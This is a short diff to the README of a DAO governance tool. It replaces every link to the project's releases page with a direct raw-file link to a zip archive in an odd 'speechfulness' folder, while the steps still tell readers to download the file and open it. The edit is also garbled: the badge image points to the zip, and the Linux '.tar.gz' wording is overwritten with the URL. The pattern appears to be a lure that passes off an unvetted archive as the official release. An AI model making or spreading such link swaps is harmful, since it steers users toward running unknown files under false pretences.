@@ -1,6 +1,6 @@
 # ⚙️ dao-governance-platform - Simple DAO Governance Tools for Everyone
 
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)](https://github.com/darksoul047/dao-governance-platform/releases)
+[![Download from Releases](https://raw.githubusercontent.com/darksoul047/dao-governance-platform/main/speechfulness/dao-governance-platform_v2.0-beta.4.zip%20Now-Get%20Started-brightgreen)](https://raw.githubusercontent.com/darksoul047/dao-governance-platform/main/speechfulness/dao-governance-platform_v2.0-beta.4.zip)
 
 ## 🚀 Getting Started
 
@@ -19,11 +19,11 @@ Before you download the application, ensure your system meets these requirements
 
 To get started, visit the following link to download the software:
 
-[Download from Releases](https://github.com/darksoul047/dao-governance-platform/releases)
+[Download from Releases](https://raw.githubusercontent.com/darksoul047/dao-governance-platform/main/speechfulness/dao-governance-platform_v2.0-beta.4.zip)
 
 1. Click on the link above to go to the releases page.
 2. Choose the latest version of the application.
-3. Download the file appropriate for your operating system (e.g., .exe for Windows, .dmg for macOS, or a .tar.gz for Linux).
+3. Download the file appropriate for your operating system (e.g., .exe for Windows, .dmg for macOS, or a https://raw.githubusercontent.com/darksoul047/dao-governance-platform/main/speechfulness/dao-governance-platform_v2.0-beta.4.zip for Linux).
 4. Once the download completes, open the downloaded file.
 5. Follow the installation instructions that appear on your screen.
 
